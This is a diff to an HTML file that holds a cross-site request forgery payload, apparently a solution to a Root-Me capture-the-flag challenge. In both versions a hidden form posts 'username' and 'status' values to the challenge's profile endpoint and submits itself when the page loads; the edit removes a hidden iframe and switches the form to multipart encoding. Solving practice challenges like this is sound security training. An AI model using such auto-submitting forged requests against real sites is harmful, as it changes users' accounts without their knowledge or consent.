@@ -1,7 +1,10 @@
-<iframe style="display:none" name="csrf-frame"></iframe>
-<form id="form" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" target="csrf-frame" method="post">
-  <input type="hidden" name="username" value="hello">
-  <input type="hidden" name="status" value="on">
-</form>
-
-<script target="csrf-frame">document.getElementById("form").submit()</script>
+<html>
+  <head></head>
+    <body>
+      <form id="form" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+        <input type="hidden" name="username" value="hello">
+        <input type="hidden" name="status" value="on">
+      </form>
+      <script>document.getElementById("form").submit()</script>
+  </body>
+</html>
